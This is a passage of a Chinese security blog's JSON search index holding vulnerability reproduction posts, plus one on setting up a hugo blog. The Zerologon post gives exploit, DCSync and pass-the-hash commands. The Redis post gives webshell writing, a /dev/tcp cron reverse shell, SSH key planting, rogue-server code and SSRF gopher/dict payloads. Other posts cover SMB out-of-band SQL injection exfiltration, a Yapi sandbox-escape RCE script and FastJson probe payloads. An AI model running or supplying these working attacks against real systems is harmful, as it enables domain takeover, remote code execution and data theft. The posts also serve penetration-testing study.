not to use systemd for cgroups","tags":["软件安装"],"title":"离线安装docker","uri":"https://ad-calcium.github.io/2021/07/%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85docker/","year":"2021"},{"content":"漏洞介绍 2020年08月12日，Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏洞评分：10分\r攻击者通过NetLogon（MS-NRPC），建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。成功利用此漏洞的攻击者可以在该网络中的设备上运行经特殊设计的应用程序\r 影响版本 Windows Server 2008 R2 for x64-based Systems Service Pack 1\rWindows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)\rWindows Server 2012\rWindows Server 2012 (Server Core installation)\rWindows Server 2012 R2\rWindows Server 2012 R2 (Server Core installation)\rWindows Server 2016\rWindows Server 2016 (Server Core installation)\rWindows Server 2019\rWindows Server 2019 (Server Core installation)\rWindows Server, version 1903 (Server Core installation)\rWindows Server, version 1909 (Server Core installation)\rWindows Server, version 2004 (Server Core installation)\r 复现环境 版本: Windows Server 2012\rIP: 10.99.99.253\rBlosname: OWA2013 (域控的主机名)\r 漏洞工具 impacket https://github.com/SecureAuthCorp/impacket\r重置域内管理员密码poc https://github.com/dirkjanm/CVE-2020-1472\r恢复密码poc https://github.com/risksense/zerologon\r 漏洞复现 福漏洞开始使用exp重置管理员密钥\npython3 cve-2020-1472-exploit.py OWA2013 10.99.99.253\r 通过 Dcsync获取域内所有有用户hash\npython3 secretsdump.py rootkit/OWA2013\\$@10.99.99.253 -just-dc -no-pass\r 得到了域控的 Hash:\nrootkit.org\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c:::\r 通过 wmic hash 传递获取shell：\npython3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c rootkit.org/Administrator@10.99.99.253\r 通过导出 sam system 等文件到本地，获取域控机器上本地保存之前的 hash 值用于恢复，不然就脱域了：\n备份注册表\n导出注册表文件\rreg save HKLM\\SYSTEM system.save\rreg save HKLM\\SAM sam.save\rreg save HKLM\\SECURITY security.save\r将文件下载到本地\rget system.save\rget sam.save\rget security.save\r删除文件\rdel /f system.save\rdel /f sam.save\rdel /f security.save\r 之后你会发现再你的当前机器会生成几个文件：sam.save、security.save、system.save\n之后通过 sam.save、security.save、system.save 这些文件获得原来域控机器上的 Ntlm Hash 值，用于恢复密码：\npython3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL\r 通过拿到 $MACHINE.ACC: 的值，然后进行恢复(注意只有后半部分)\n$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:7e304360db8cdb95d09a960607fcc526\r 恢复密码\npython3 reinstall_original_pw.py OWA2013 10.99.99.253 7e304360db8cdb95d09a960607fcc526\r 验证是否恢复密码成功\npython3 secretsdump.py rootkit/OWA2013\\$@10.99.99.253 -just-dc -no-pass\r ","id":9,"section":"posts","summary":"漏洞介绍 2020年08月12日，Windows官方 发布了 NetLogon 特权提升漏洞 的风险通告，该漏洞编号为 CVE-2020-1472，漏洞等级：严重，漏","tags":["漏洞复现","内网"],"title":"NetLogon 域内提权漏洞（CVE-2020-1472）","uri":"https://ad-calcium.github.io/2021/07/netlogon-%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9Ecve-2020-1472/","year":"2021"},{"content":"Redis介绍 Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库。\n###安装教程\n第1步：Redis下载\rwget http://download.redis.io/releases/redis-3.2.11.tar.gz\r第2步：Redis解压、编译\rtar zxvf redis-3.2.11.tar.gz\rcd redis-3.2.11\rmake #编译失败也可以的，不影响\rmake install\r进入 redis.conf 文件，还原漏洞现场，修改配置文件\r vim redis.conf 新版中这里是127.0.0.1，将他注释掉或者改为0.0.0.0\n将保护模式改为no\n完成之后启动服务\nredis-server redis.conf 启动服务\rredis-cli shutdown 关闭服务\r 关闭防火墙命令： service iptables stop 永久关闭防火墙：chkconfig iptables off\n永久有效：修改/etc/sysconfig/selinux 将SELINUX=enforcing，改为SELINUX=disabled。然后重启 即时有效：setenforce 0\n在kali下安装redis-cli\nwget http://download.redis.io/releases/redis-2.8.12.tar.gz 下载\rtar -xzf redis-2.8.12.tar.gz # 解压\rcd redis-2.8.12 #cd进入redis目录\rmake #make安装\r进入src目录\rcd src\r./redis-cli -h 如果这个命令出现帮助界面说明可以正常使用\r连接靶机\r./redis-cli -h 192.168.62.137 -p 6379\r 尝试输入命令info，可以成功执行\n查看所有秘钥（我这表示为空，没有秘钥）\nkeys *\r 攻击利用 写入文件 设置路径，把shell写入到网站根目录下（/var/www/html/）\rCONFIG SET dir /var/www/html/\r修改备份文件名\rCONFIG SET dbfilename 1.php\r写入内容\rSET webshell \u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot;\rsave\r 查看是否写入成功\n反弹shell 在kali里开启监听\nnc -lvvp 9999\nset shell \u0026quot;\\n\\n*/1 * * * * /bin/bash -i\u0026gt;\u0026amp;/dev/tcp/192.168.239143/9999 0\u0026gt;\u0026amp;1\\n\\n\u0026quot;\rconfig set dir /var/spool/cron\rconfig set dbfilename root\rsave\r 等待一分钟，kali已经成功接收shell\n通过写入SSH公钥实现SSH登录 原理就是在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生一个授权的key。\n在kali生成ssh公钥 (一路回车即可) ssh-keygen -t rsa\n查看id_rsa.pub\ncat /root/.ssh/id_rsa.pub\r 执行redis命令\nconfig set dir /root/.ssh/\rconfig set dbfilename authorized_keys\rset x \u0026quot;\\n\\n\\nssh-rsa 这里填id_rsa.pub的内容 root@kali\\n\\n\\n\u0026quot;\rsave\r清空数据库\rFLUSHALL\r Redis主从复制getshell 原理： 利用主从特性传输数据，通过模块加载，增加执行命令的函数。\n下载镜像 docker pull damonevking/redis5.0\n映射端口并运行容器 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server \n自动化工具 exp下载地址： redis-rce redis-rogue-server\n环境编译\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\rcd RedisModules-ExecuteCommand/\rmake\rgit clone https://github.com/Ridter/redis-rce.git\rcd redis-rce/\rcp ../RedisModules-ExecuteCommand/src/module.so ./\rpip install -r requirements.txt python redis-rce.py -r 136.244.70.243（目标ip) -L 136.244.70.243（自己的ip） -f module.so\r python3 redis-rce.py -r 136.244.70.243（目标ip) -L 136.244.70.243（自己的ip） -f exp.so\n手动 利用docker开启2台redis容器用于复现主从复制。\n下载镜像 docker pull damonevking/redis5.0\n映射端口并运行容器\ndocker run -p 6379:6379 -d damonevking/redis5.0 redis-server\rdocker run -p 6666:6379 -d --name redis-service-3 damonevking/redis5.0\r 首先进入主redis\nset webshell \u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot;\rget webshell\r 在本地 redis 设置远程服务器 redis 服务器为主服务器，同步远程服务器 redis 的内容\nslaveof 192.168.72.196 6379\rrole\rget shell\r 写shell\nconfig set dir /data/\rconfig set dbfilename 11.txt\rsave\r 关闭同步\rSLAVEOF NO ONE\r清除缓存\rflushall\r 编写脚本，构造恶意Redis服务器，监听本地端口1234，加载exp.so。 python RogueServer.py \u0026ndash;lport 1234 \u0026ndash;exp exp.so\nconfig set dir ./ #设置redis的备份路径为当前目录\rconfig set dbfilename exp.so #设置备份文件名为exp.so，默认为dump.rdb\rslaveof 192.168.172.129 1234 #设置主服务器IP和端口\rmodule load ./exp.so #加载恶意模块\rslaveof no one #切断主从，关闭复制功能\rsystem.exec 'whoami' #执行系统命令\rsystem.rev 127.0.0.1 9999 config set dbfilename dump.rdb #通过dump.rdb文件恢复数据\rsystem.exec 'rm ./exp.so' #删除exp.so\rmodule unload system #卸载system模块的加载\r 成功执行系统命令\nRedis服务端模拟脚本\nimport socket\rfrom time import sleep\rfrom optparse import OptionParser\rdef RogueServer(lport):\rresp = \u0026quot;\u0026quot;\rsock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\rsock.bind((\u0026quot;0.0.0.0\u0026quot;,lport))\rsock.listen(10)\rconn,address = sock.accept() sleep(5)\rwhile True: data = conn.recv(1024)\rif \u0026quot;PING\u0026quot; in data:\rresp=\u0026quot;+PONG\u0026quot;+CLRF\rconn.send(resp)\relif \u0026quot;REPLCONF\u0026quot; in data:\rresp=\u0026quot;+OK\u0026quot;+CLRF\rconn.send(resp)\relif \u0026quot;PSYNC\u0026quot; in data or \u0026quot;SYNC\u0026quot; in data:\rresp = \u0026quot;+FULLRESYNC \u0026quot; + \u0026quot;Z\u0026quot;*40 + \u0026quot; 1\u0026quot; + CLRF\rresp += \u0026quot;$\u0026quot; + str(len(payload)) + CLRF\rresp = resp.encode()\rresp += payload + CLRF.encode()\rif type(resp) != bytes:\rresp =resp.encode() conn.send(resp) #elif \u0026quot;exit\u0026quot; in data:\rbreak\rif __name__==\u0026quot;__main__\u0026quot;:\rparser = OptionParser() parser.add_option(\u0026quot;--lport\u0026quot;, dest=\u0026quot;lp\u0026quot;, type=\u0026quot;int\u0026quot;,help=\u0026quot;rogue server listen port, default 21000\u0026quot;, default=21000,metavar=\u0026quot;LOCAL_PORT\u0026quot;) parser.add_option(\u0026quot;-f\u0026quot;,\u0026quot;--exp\u0026quot;, dest=\u0026quot;exp\u0026quot;, type=\u0026quot;string\u0026quot;,help=\u0026quot;Redis Module to load, default exp.so\u0026quot;, default=\u0026quot;exp.so\u0026quot;,metavar=\u0026quot;EXP_FILE\u0026quot;) (options , args )= parser.parse_args()\rlport = options.lp\rexp_filename = options.exp\rCLRF=\u0026quot;\\r\\n\u0026quot;\rpayload=open(exp_filename,\u0026quot;rb\u0026quot;).read()\rprint \u0026quot;Start listing on port: %s\u0026quot; %lport\rprint \u0026quot;Load the payload: %s\u0026quot; %exp_filename RogueServer(lport)\r SSRF+Redis 反弹shell 参照Redis手动getshell的过程，可轻易实现SSRF+Redis反弹shell。\n以curl为例，漏洞代码为ssrf.php:\n\u0026lt;?php\r$ch = curl_init();\rcurl_setopt($ch, CURLOPT_URL, $_GET['url']);\r#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\rcurl_setopt($ch, CURLOPT_HEADER, 0);\r#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);\rcurl_exec($ch);\rcurl_close($ch);\r?\u0026gt;\r 环境准备： 模拟内网未授权Redis服务器：192.168.172.131 模拟攻击者机器：192.168.172.129 在攻击者机器上构建恶意Redis服务器，同时监听本地9999端口等待shell返回。\n1、利用dict协议反弹shell\n#查看当前redis的相关配置\rssrf.php?url=dict://192.168.172.131:6379/info\r#设置备份文件名\rssrf.php?url=dict://192.168.172.131:6379/config:set:dbfilename:exp.so\r#连接恶意Redis服务器\rssrf.php?url=dict://192.168.172.131:6379/slaveof:192.168.172.129:1234\r#加载恶意模块\rssrf.php?url=dict://192.168.172.131:6379/module:load:./exp.so\r#切断主从复制\rssrf.php?url=dict://192.168.172.131:6379/slaveof:no:one\r#执行系统命令\rssrf.php?url=dict://192.168.172.131:6379/system.rev:192.168.172.129:9999\r 2、利用gopher协议反弹shell\n#设置文件名，连接恶意Redis服务器\rgopher://192.168.172.131:6379/_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520192.168.172.129%25201234%250d%250aquit\r#加载exp.so，反弹shell\rgopher://192.168.172.131:6379/_module%2520load%2520./exp.so%250d%250asystem.rev%2520192.168.172.129%25209999%250d%250aquit\r 3、利用这两种协议，都可以成功获取shell。\n","id":10,"section":"posts","summary":"Redis介绍 Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库。 ###安装教程","tags":["漏洞复现","未授权"],"title":"redis未授权","uri":"https://ad-calcium.github.io/2021/07/redis%E6%9C%AA%E6%8E%88%E6%9D%83/","year":"2021"},{"content":"前言 温故而知新，今天在整理古老的近乎失传的DNS外带注入方法时，偶然间发现外带数据的装载区域并不一定是 域名前缀。放在后面也是可以的，由于目前网络上没有相关的记载，姑且称之为SMB外带注入吧。\r 1.搭建测试环境 系统:centos7\n首先安装smb服务\nyum install samba -y\r 修改配置文件: vim /etc/samba/smb.conf\n[global]\rmap to guest = Bad User\rserver role = standalone server\rusershare allow guests = yes\ridmap config * : backend = tdb\rsmb ports = 445\rlog level = 10\r[share]\rcomment = share\rpath = /tmp\rguest ok = yes\rwritable =yes\rbrowsable = yes\r#force user = smbuser\r 保存配置文件, 重启smb服务\nsystemctl restart smb.service\r 在windows环境的机器，上面安装MySQL ，建议安装 MySQL 5.7.16 以下版本，主要是由于高版本有一个默认选项secure_file_priv ，默认不允许load_file 。 如果安装的数据库版本\u0026gt;=MySQL 5.7.16 在my.ini文件中将secure_file_priv设置为空, 修改完成后, 记得重启mysql服务\nshow global variables like '%secure%';\r smb外带注入与DNS外带注入比较:\nsmb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。\rsmb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。\r 构造sql语句：\nselect load_file(concat(\u0026quot;\\\\\\\\\u0026lt;IP\u0026gt;\\\\\u0026quot;,(SQL语句),\u0026quot;\\\\xxx\u0026quot;))\r为了方便从log里提取查询的内容，可以构造如下语句\rselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\share[\u0026quot;,database(),\u0026quot;]\\\\1.txt\u0026quot;));\r 我们在MySQL服务器上执行这样一条SQL语句：\nselect load_file('\\\\\\\\10.99.99.234\\\\share\\\\1.txt');\r在samba服务器上查看到了这样一条日志：\r[2021/07/03 03:27:45.437996, 10, pid=9939, effective(0, 0), real(0, 0)] ../../source3/lib/util_event.c:54(smbd_idle_event_handler)\r 获取当前数据库名\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\share[\u0026quot;,database(),\u0026quot;]\\\\1.txt\u0026quot;));\r 查看smb日志\n tail -f /var/log/samba/log.smbd | grep \u0026quot;failed to find service\u0026quot;\r 查询当前数据库里的表\n1. 使用limit\r2. substring截断\r 使用limit请先获取总共的表数\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\test[\u0026quot;,(select count(table_name) from information_schema.tables where table_schema=database()),\u0026quot;]\\\\1.txt\u0026quot;));\r 再用limit逐个查询\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\test[\u0026quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),\u0026quot;]\\\\1.txt\u0026quot;));\r 验证第test库中的第一个表名是否为aggregate_graph_templates substring截断 截断到120字符串即可\nselect load_file(concat(\u0026quot;\\\\\\\\10.99.99.234\\\\test[\u0026quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),\u0026quot;]\\\\1.txt\u0026quot;));\r 另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破 NTLM-relay攻击参考: https://www.cnblogs.com/car7n/p/14887818.html\nselect load_file('\\\\\\\\10.99.99.245\\\\x');\r kali运行responder\nresponder -I eth0 -f 10.99.99.41\r用法: -I表示指定的网卡，-f表示允许攻击者查看受害者的主机指纹。\r 参考地址: https://422926799.github.io/posts/af61cc76.html http://moonslow.com/article/smb_sql_injection\n","id":11,"section":"posts","summary":"前言 温故而知新，今天在整理古老的近乎失传的DNS外带注入方法时，偶然间发现外带数据的装载区域并不一定是 域名前缀。放在后面也是可以的，由于目前","tags":["小技巧","web安全"],"title":"SMB外带注入","uri":"https://ad-calcium.github.io/2021/07/smb%E5%A4%96%E5%B8%A6%E6%B3%A8%E5%85%A5/","year":"2021"},{"content":"0x01 漏洞介绍 Yapi 由 YMFE开源，旨在为开发、产品、测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布、维护API。\n安全人员在Yapi官方Github仓库提交了漏洞issues，地址为:https://github.com/YMFE/yapi/issues/2233。\n0x02 漏洞描述 YAPI接口管理平台是国内某旅行网站的大前端技术中心开源项目，使用mock数据/脚本作为中间交互层，为前端后台开发与测试人员提供更优雅的接口管理服务，该系统被国内较多知名互联网企业所采用。\nYApi 是高效、易用、功能强大的 api 管理平台。但因为大量用户使用 YAPI的默认配置并允许从外部网络访问 YApi服务，导致攻击者注册用户后，即可通过 Mock功能远程执行任意代\n0x03 FOFA语句 app=\u0026quot;YApi\u0026quot;\ricon_hash=\u0026quot;-715193973\u0026quot;\r 0x03 Yapi部署教程 使用Docker构建Yapi(Ubuntu环境)。\n启动mongodb。\ndocker run -d --name mongo-yapi -p 27017:27017 mongo\r 获取 Yapi 镜像，版本信息可在 阿里云镜像仓库查看\ndocker pull registry.cn-hangzhou.aliyuncs.com/anoy/yapi\r 自定义配置文件挂载到目录/api/config.json，宿主机/config/config.json 内容为以下代码：\n{\r\u0026quot;port\u0026quot;: \u0026quot;3000\u0026quot;,\r\u0026quot;adminAccount\u0026quot;: \u0026quot;admin@qq.com\u0026quot;,\r\u0026quot;db\u0026quot;: {\r\u0026quot;servername\u0026quot;: \u0026quot;mongo-yapi\u0026quot;,\r\u0026quot;DATABASE\u0026quot;: \u0026quot;yapi\u0026quot;,\r\u0026quot;port\u0026quot;: 27017\r},\r\u0026quot;mail\u0026quot;: {\r\u0026quot;enable\u0026quot;: true,//邮件通知\r\u0026quot;host\u0026quot;: \u0026quot;smtp.qq.com\u0026quot;,//邮箱服务器\r\u0026quot;port\u0026quot;: 465,\r\u0026quot;from\u0026quot;: \u0026quot;admin@qq.com\u0026quot;,//发件人邮箱\r\u0026quot;auth\u0026quot;: {\r\u0026quot;user\u0026quot;: \u0026quot;adminadmin@qq.com\u0026quot;,//邮箱服务器账号\r\u0026quot;pass\u0026quot;: \u0026quot;123456\u0026quot;//邮箱服务器密码\r}\r}\r}\r 初始化Yapi数据库索引及管理员账号。\n\rdocker run -it --rm \\\r-v /config/config.json:/api/config.json \\\r--link mongo-yapi:mongo \\\r--entrypoint npm \\\r--workdir /api/vendors \\\rregistry.cn-hangzhou.aliyuncs.com/anoy/yapi \\\rrun install-server\r 启动Yapi服务。\n\rdocker run -d \\\r-v /config/config.json:/api/config.json \\\r--name yapi \\\r--link mongo-yapi:mongo \\\r--workdir /api/vendors \\\r-p 3000:3000 \\\rregistry.cn-hangzhou.aliyuncs.com/anoy/yapi \\\rserver/app.js\r 访问http://localhost:3000登录账号admin@qq.com，密码 123456。\n漏洞利用 注册用户 利用前提为Yapi开启了注册功能，打开靶机地址，注册一个账号。\n添加项目 添加一个项目。 输入项目名称，输入完成后点击创建名称 添加接口 点击添加接口 输入接口名称和接口路径，输入完成后点击提交 添加Mock脚本 点击高级Mock，并打开脚本页面 开启脚本，输入Mock脚本\n脚本内容:\nconst sandbox = this\rconst ObjectConstructor = this.constructor\rconst FunctionConstructor = ObjectConstructor.constructor\rconst myfun = FunctionConstructor('return process')\rconst process = myfun()\rmockJson = process.mainModule.require(\u0026quot;child_process\u0026quot;).execSync(\u0026quot;whoami\u0026quot;).toString()\r 点击保存，打开预览界面。访问Mock地址即可执行命令。 访问Mock地址 成功获取当前用户\n可将Mock脚本中的whoami改成任意语句，可执行反弹shell等操作。\n修复建议 该漏洞暂无补丁。\n临时修复建议：\n  关闭YAPI用户注册功能，以阻断攻击者注册。\n  利用请求白名单的方式限制 YAPI 相关端口。\n  排查 YAPI 服务器是否存在恶意访问记录。\n  切勿非法用途，履行白帽职责。\n批量脚本：https://raw.githubusercontent.com/ad-calcium/vuln_script/main/Yapi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.py\n","id":12,"section":"posts","summary":"0x01 漏洞介绍 Yapi 由 YMFE开源，旨在为开发、产品、测试人员提供更优雅的接口管理服务，可以帮助开发者轻松创建、发布、维护API。 安全人员在Yapi","tags":["漏洞复现","web安全"],"title":"Yapi远程命令执行漏洞","uri":"https://ad-calcium.github.io/2021/07/yapi%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"0x01 影响范围 V7.1、V7.1SP1\nV7.0、V7.0SP1、V7.0SP2、V7.0SP3\nV6.1、V6.1SP1、V6.1SP2\nV6.0、V6.0SP1\nV5.6、V5.6SP1\n0x02 漏洞搜索 搜索语法\nFOFA：\u0026quot;seeyon\u0026quot; \u0026amp;\u0026amp; after=\u0026quot;2021-05-01\u0026quot;\r 0x03 漏洞检测 Jndi影响范围：\n1、rmi的利用方式：适用jdk版本：JDK 6u132、JDK 7u122、JDK 8u113之前\n2、ldap的利用方式：适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前\n区分FastJson与Jackson：\n1）不闭合花括号看报错信息方法\n2）减少参数方法\n{\u0026ldquo;name\u0026rdquo;:\u0026ldquo;S\u0026rdquo;, \u0026ldquo;age\u0026rdquo;:21}//Fastjson 是不会报错\n{\u0026ldquo;name\u0026rdquo;:\u0026ldquo;S\u0026rdquo;, \u0026ldquo;age\u0026rdquo;:21,\u0026ldquo;xxx\u0026rdquo;:123}// Jackson 语法相对比较严格,会报错\n3）fastjson报错关键词:\ncom.alibaba.fastjson.JSONException , 触发方式如下\n{\u0026ldquo;x\u0026rdquo;:\u0026quot;\n[\u0026ldquo;x\u0026rdquo;:1]\n{\u0026ldquo;x\u0026rdquo;:{\u0026quot;@type\u0026quot;:\u0026ldquo;java.lang.AutoCloseable\u0026rdquo;\nDNS探测方法：\n注意：Content-Type: application/json\n# 未报错poc\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.net.InetSocketAddress\u0026quot;{\u0026quot;address\u0026quot;:,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}}}\r{\u0026quot;x\u0026quot;:{{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}:\u0026quot;x\u0026quot;}}\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;com.alibaba.fastjson.JSONObject\u0026quot;, {\u0026quot;@type\u0026quot;: \u0026quot;java.net.URL\u0026quot;, \u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}}\u0026quot;\u0026quot;}}\r# 报错,但仍有效\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet4Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}}\r{\u0026quot;x\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet6Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;dnslog\u0026quot;}}\r{\u0026quot;x\u0026quot;:Set[{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}]}\r# 报错,且返回400,但仍有效\r{\u0026quot;x\u0026quot;:Set[{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}}\r{\u0026quot;x\u0026quot;:{{\u0026quot;@type\u0026quot;:\u0026quot;java.net.URL\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;http://dnslog\u0026quot;}:0}\r 0x04 漏洞复现 1.使用dnslog验证漏洞, 打开http://www.dnslog.cn获取域名\n漏洞POC\nPOST /seeyon/main.do?method=changeLocale HTTP/1.1\rHost: xxxxx\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 71\r_json_params={\u0026quot;@type\u0026quot;:\u0026quot;java.net.Inet4Address\u0026quot;,\u0026quot;val\u0026quot;:\u0026quot;qn94mq.dnslog.cn\u0026quot;}\r 3.将上面的代码放到BurpSuite中，然后设置好对应的HOST和端口。\n查看dnslog 成功回显, 说明存在漏洞\n","id":13,"section":"posts","summary":"0x01 影响范围 V7.1、V7.1SP1 V7.0、V7.0SP1、V7.0SP2、V7.0SP3 V6.1、V6.1SP1、V6.1SP2 V6.0、","tags":["漏洞复现"],"title":"致远伪0day-FastJson利用链","uri":"https://ad-calcium.github.io/2021/07/%E8%87%B4%E8%BF%9C%E4%BC%AA0day-fastjson%E5%88%A9%E7%94%A8%E9%93%BE/","year":"2021"},{"content":"1、hugo hugo是基于命令行的静态网站生成工具，使用go语言开发。因此，下载编译好的二进制文件，就可以直接运行，无需安装其它依赖。将hugo添加到环境变量，更便于使用。\nhugo源码地址：hugo github\n常用命令列表 通过hugo help命令可以获取hugo命令行的帮助文档。\nhugo new site 创建一个新的网站(骨架), 例如: hugo new site myblog，他会在当前目录下创建一个myblog的文件夹，并在其中填充必须的必须的目录和文件。\n下面是myblog文件夹的结构：\n├─archetypes\r├─content\r├─data\r├─layouts\r├─resources\r│ └─_gen\r│ ├─assets\r│ └─images\r├─static\r└─themes\r└─study-theme\r├─archetypes\r├─layouts\r│ ├─partials\r│ └─_default\r└─static\r├─css\r└─js\r hugo new 添加网站内容. 例如: hugo new about.md，他会在content目录下生成一个about.md的文件，根据这个文件可以生成对应的静态页面。可以在about.md前面添加对应的路径，但文件会以content为根目录，也就是说所有添加新文件都会存放在content目录下面。\nhugo new theme 为网站添加UI，也就是模板文件/主题文件。例如: hugo new theme mytheme。这会在themes目录下创建一个mytheme目录，mytheme目录中会默认添加一些基本的文件结构。所有的模板/主题文件都会保存在themes目录中。\nhugo hugo本身就是一个命令，他的作用就是生成静态网站，默认在生成的静态文件保存在public目录中，也可以指定路径。\nhugo server hugo自带一个web服务器，运行hugo server后可以通过 http://localhost:1313 来访问静态网站。\n下面是hugo server常用的参数, 注意大小写:\n-p 端口: 修改默认端口\n-D: 在使用server预览网站时，draft属性为ture的草稿文件是不会生成预览的，添加-D后可以预览草稿文件。\n2、hugo theme hugo theme的下载地址：hugo themes\n我这里选择用的是[hugo-theme-pure]https://github.com/xiaoheiAh/hugo-theme-pure\n用这个的原因是：界面比较简洁、有文章归档、有关键词搜索（这个我很需要）\n3、使用hugo Page Bundles 文档地址：Page Bundles\nPage Bundles 简单来说就是可以把md文件和图片置于同一个目录下（正常引用图片需要放在static目录下），其中images目录保存index.md所有引用图片。这样做的好处是，方便以后查找和做导出。\n4、编辑博客内容 使用markdown编辑文本，放在content目录下。\n5、本地生成 生成静态网页到public目录下：\n hugo\n 运行本地web服务：\n hugo server\n 6、部署到github 创建github仓库，Repository name 是 用户名.github.io：\n部署脚本：\n#!/bin/bash\r# 部署到 github pages 脚本\r# 错误时终止脚本\rset -e\r# 删除打包文件夹\r# rm -rf public\r# 打包\rhugo --baseUrl=\u0026quot;https://far-morningstar.github.io/\u0026quot;\r# 进入打包文件夹\rcd public\r# Add changes to git，第一提交需要 git init\r# git init\rgit add .\r# Commit changes.\rmsg=\u0026quot;building site `date`\u0026quot;\rif [ $# -eq 1 ]\rthen msg=\u0026quot;$1\u0026quot;\rfi\rgit commit -m \u0026quot;$msg\u0026quot;\r# 添加远程仓库\rgit remote add origin https://github.com/far-morningstar/far-morningstar.github.io.git\r# 推送到github git push -u origin master\r# 回到原文件夹\rcd ..\r 我这里使用的是windows系统，安装Cmder，可以执行bash脚本： ","id":14,"section":"posts","summary":"1、hugo hugo是基于命令行的静态网站生成工具，使用go语言开发。因此，下载编译好的二进制文件，就可以直接运行，无需安装其它依赖。将hu","tags":["安装博客"],"title":"hugo搭建个人博客","uri":"https://ad-calcium.github.io/2020/07/hugo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","year":"2020"}],"tags":[{"title":"MSSQL","uri":"https://ad-calcium.github.io/tags/mssql/"},{"title":"web安全","uri":"https://ad-calcium.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"title":"web渗透","uri":"https://ad-calcium.github.io/tags/web%E6%B8%97%E9%80%8F/"},{"title":"内网","uri":"https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91/"},{"title":"内网渗透","uri":"https://ad-calcium.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"title":"安装博客","uri":"https://ad-calcium.github.io/tags/%E5%AE%89%E8%A3%85%E5%8D%9A%E5%AE%A2/"},{"title":"小技巧","uri":"https://ad-calcium.github.io/tags/%E5%B0%8F%E6%8A%80%E5%B7%A7/"},{"title":"未授权","uri":"https://ad-calcium.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/"},{"title":"流量代理","uri":"https://ad-calcium.github.io/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/"},{"title":"漏洞复现","uri":"https://ad-calcium.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"title":"软件安装","uri":"https://ad-calcium.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/"}]}